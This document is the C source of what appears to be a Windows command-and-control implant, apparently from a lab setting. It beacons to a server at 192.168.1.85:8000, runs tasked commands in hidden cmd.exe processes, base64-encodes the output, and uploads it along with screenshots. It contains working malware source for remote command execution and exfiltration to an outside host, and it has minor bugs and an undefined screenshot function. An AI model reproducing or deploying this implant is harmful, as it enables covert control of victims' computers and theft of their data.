#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

#define C2_HOST           L"http://192.168.1.85:8000"
#define C2_BEACON_URL     L"http://192.168.1.85:8000/c2/beacon/?id=implant001"
#define C2_UPLOAD_PATH    L"c2/upload/"

#define POST_HEADER       "Content-Type: application/x-www-form-urlencoded\r\n"
#define AUTH_HEADER       "X-Auth: supersecretvalue\r\n"
#define MAX_BUFFER        4096

BOOL base64_encode(const BYTE* input, DWORD inputLen, char* output, DWORD* outputLen) {
    *outputLen = 0;
    if (!CryptBinaryToStringA(input, inputLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, outputLen))
        return FALSE;
    return CryptBinaryToStringA(input, inputLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, output, outputLen);
}

int run_command(const char* cmd, char* output, int outlen) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = si.hStdError = hWrite;

    PROCESS_INFORMATION pi;
    char fullCmd[512];
    snprintf(fullCmd, sizeof(fullCmd), "cmd.exe /c %s", cmd);

    if (!CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return -1;
    }

    CloseHandle(hWrite);

    DWORD bytesRead, total = 0;
    char buf[512];
    while (ReadFile(hRead, buf, sizeof(buf), &bytesRead, NULL) && bytesRead > 0 && total < outlen - 1) {
        memcpy(output + total, buf, bytesRead);
        total += bytesRead;
    }

    output[total] = '\0';
    CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return total;
}
char* http_get(const char* host, const char* path) {
    static char response[8192] = { 0 };

    HINTERNET hInternet = InternetOpenA("Implant", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;

    HINTERNET hConnect = InternetConnectA(hInternet, host, 8000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return NULL;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return NULL;
    }

    const char* headers = AUTH_HEADER "Accept: */*\r\n";
    if (!HttpSendRequestA(hRequest, headers, strlen(headers), NULL, 0)) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return NULL;
    }

    DWORD bytesRead;
    InternetReadFile(hRequest, response, sizeof(response) - 1, &bytesRead);
    response[bytesRead] = '\0';

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return response;
}

BOOL http_post_result(const char* host, const char* path, const char* resultBase64) {
    HINTERNET hInternet = InternetOpenA(L"Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;

    HINTERNET hConnect = InternetConnectA(hInternet, host, 8000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) return FALSE;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) return FALSE;

    char postData[8500];
    snprintf(postData, sizeof(postData), "id=implant001&result=%s", resultBase64);

    BOOL sent = HttpSendRequestA(hRequest, POST_HEADER AUTH_HEADER, -1L, postData, strlen(postData));

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return sent;
}

BOOL upload_multipart_file(
    const char* host,
    int port,
    const char* path,
    const char* implant_id,
    const char* filename,
    const BYTE* file_data,
    DWORD file_size
) {
    const char* boundary = "----WININETBOUNDARY1234";
    const char* content_type_fmt = "Content-Type: multipart/form-data; boundary=%s\r\n";
    char headers[256];

    snprintf(headers, sizeof(headers), content_type_fmt, boundary);

    // Build the multipart body in memory
    DWORD body_len = 0;
    char head[1024];
    char tail[128];

    int head_len = snprintf(head, sizeof(head),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"id\"\r\n\r\n"
        "%s\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"screenshot\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        boundary, implant_id, boundary, filename
    );

    int tail_len = snprintf(tail, sizeof(tail), "\r\n--%s--\r\n", boundary);

    DWORD total_len = head_len + file_size + tail_len;

    BYTE* post_data = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total_len);
    if (!post_data) return FALSE;

    memcpy(post_data, head, head_len);
    memcpy(post_data + head_len, file_data, file_size);
    memcpy(post_data + head_len + file_size, tail, tail_len);

    // Set up the WinINet connection
    HINTERNET hInet = InternetOpenA("ScreenshotUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet) return FALSE;

    HINTERNET hConnect = InternetConnectA(hInet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInet);
        return FALSE;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInet);
        return FALSE;
    }

    BOOL sent = HttpSendRequestA(hRequest, headers, -1L, post_data, total_len);

    if (!sent) {
        printf("[-] HttpSendRequest failed: %lu\n", GetLastError());
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInet);
    HeapFree(GetProcessHeap(), 0, post_data);
    return sent;
}

BOOL upload_screenshot(const char* host) {
    PVOID bmpData = NULL;
    ULONG bmpSize = 0;

    if (ScreenshotBmp(&bmpData, &bmpSize)) {
        upload_multipart_file(
            "192.168.1.85",                // host
            8000,                          // port
            "/c2/upload/",                 // path
            "implant001",                  // id
            "screen.bmp", // filename
            (BYTE*)bmpData,
            bmpSize
        );
        HeapFree(GetProcessHeap(), 0, bmpData);
    }
}


int main() {
    PBYTE response = NULL;
    SIZE_T responseSize = 0;
    while (1) {
        char* task = http_get("192.168.1.85", "/c2/beacon/?id=implant001");
        if (!task) {
            printf("[-] GET request failed.\n");
            return -1;
        }

        printf("New Task: %s\n", task);
        char* type = strtok(task, " ");
        char* args = strtok(NULL, "\n");

        if (!type) return 0;

        if (strcmp(type, "cmd") == 0 && args) {
            char output[MAX_BUFFER] = { 0 };
            int len = run_command(args, output, sizeof(output));

            char encoded[8192] = { 0 };
            DWORD encLen = sizeof(encoded);
            if (base64_encode((BYTE*)output, len, encoded, &encLen)) {
                encoded[encLen] = '\0';
                http_post_result("192.168.1.85", "/c2/upload/", encoded);

            }
        }
        else if (strcmp(type, "screenshot") == 0) {
                upload_screenshot("192.168.1.85");
        }
        else if (strcmp(type, "exit") == 0) {
            char encoded[8192] = { 0 };
            DWORD encLen = sizeof(encoded);
            char* output = "Closed";

            if (base64_encode((BYTE*)output, sizeof(output), encoded, &encLen)) {
                encoded[encLen] = '\0';
                http_post_result("192.168.1.85", "/c2/upload/", encoded);
            }
            ExitProcess(0);
        }

        LocalFree(response);
        Sleep(10000);
    }
    return 0;
}